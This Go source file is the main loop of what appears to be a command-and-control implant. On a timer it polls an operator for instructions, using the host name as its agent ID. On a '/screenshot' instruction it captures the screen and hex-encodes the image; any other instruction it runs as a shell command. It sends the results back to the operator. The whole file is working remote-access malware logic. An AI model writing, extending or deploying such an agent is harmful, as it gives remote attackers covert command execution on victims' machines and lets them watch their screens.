package main

import (
	"common/utils"
	"encoding/hex"
	"fmt"
	"os"
	"time"

	"github.com/zarkones/ControlABILITY/screenshot"
	profiles "github.com/zarkones/ControlPROFILE"
)

func main() {
	profile, err := profiles.Load(rawProfile)
	utils.MaybeFatal(err)

	agentId, err := os.Hostname()
	utils.MaybeFatal(err)

	for range time.Tick(profile.GetTickAmount()) {
		instruction, err := receive(&agentId, &profile)
		if err != nil {
			fmt.Println("receive error:", err)
			continue
		}

		if len(instruction) == 0 {
			fmt.Println("empty instruction, skipping...")
			continue
		}

		output := func() string {
			if instruction == "/screenshot" {
				captured, err := screenshot.Capture()
				if err != nil {
					return err.Error()
				}
				return hex.EncodeToString(captured)
			}

			output, err := shell(instruction)
			if err != nil {
				if len(output) == 0 {
					output = err.Error()
				} else {
					output += "\n" + err.Error()
				}
			}
			return output
		}()

		if err := send(&agentId, &profile, &output); err != nil {
			fmt.Println("send error:", err)
			continue
		}
	}
}
